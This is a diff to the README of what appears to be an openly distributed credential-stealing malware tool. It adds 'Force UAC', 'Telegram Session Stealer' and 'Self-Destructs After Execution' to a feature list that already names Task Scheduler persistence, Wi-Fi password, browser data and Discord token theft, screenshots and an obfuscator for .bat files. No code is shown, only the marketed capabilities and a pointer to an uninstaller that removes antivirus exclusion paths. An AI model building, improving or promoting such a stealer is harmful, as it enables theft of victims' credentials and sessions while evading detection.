@@ -39,9 +39,12 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 
 
 #  Features
+- [x] GUI Builder
+- [x] Force UAC
 - [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
 - [x] Extracts WiFi Passwords
 - [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge etc.)
+- [x] Telegram Session Stealer 
 - [x] Extracts Discord Token
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
 - [x] Takes Desktop Screenshot  
@@ -54,6 +57,7 @@ Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat file
 - [x] List of Running Services & Applications
 - [x] List TCP Connections and Underlying Process
 - [x] Extracts Product Key
+- [x] Self-Destructs After Execution
  
 ## 🗑 Uninstaller (Removes the Scheduled Task, Script Folder and ExclusionPaths)
 - Open a new Elevated Powershell Console and Paste the Contents below
